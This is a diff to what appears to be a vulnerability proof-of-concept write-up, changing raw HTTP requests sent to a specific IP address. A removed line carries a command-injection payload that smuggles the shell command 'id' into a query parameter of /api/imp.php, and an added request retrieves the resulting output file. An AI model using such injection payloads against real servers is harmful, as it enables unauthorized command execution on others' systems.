@@ -42,7 +42,7 @@ Cookie: localecookie=a%3A3%3A%7Bs%3A12%3A%22DEFAULT_LANG%22%3Bs%3A11%3A%22zh_CN.
 ![image-20250125220205777](./3.png)
 
 ```
-GET /api/imp.php?type=immediate&id=|id%3E1.txt| HTTP/1.1
+GET /api/1.txt HTTP/1.1
 Host: 58.34.251.124:30443
 Connection: keep-alive
 sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"
@@ -57,7 +57,9 @@ Sec-Fetch-User: ?1
 Sec-Fetch-Dest: document
 Accept-Encoding: gzip, deflate, br, zstd
 Accept-Language: zh-CN,zh;q=0.9
-Cookie: localecookie=a%3A3%3A%7Bs%3A12%3A%22DEFAULT_LANG%22%3Bs%3A11%3A%22zh_CN.UTF-8%22%3Bs%3A12%3A%22FIELD_PREFIX%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22PACKAGE%22%3Bs%3A3%3A%22oma%22%3B%7D; PHPSESSID=4ce3c4182e3a2d2684bb6964f4a16842
+Cookie: PHPSESSID=51650b0d4aaa5714b1580d6e7bdb5fc1
+If-None-Match: "3490564580"
+If-Modified-Since: Sat, 25 Jan 2025 13:26:02 GMT
 ```
 
 ![image-20250125220049338](./4.png)
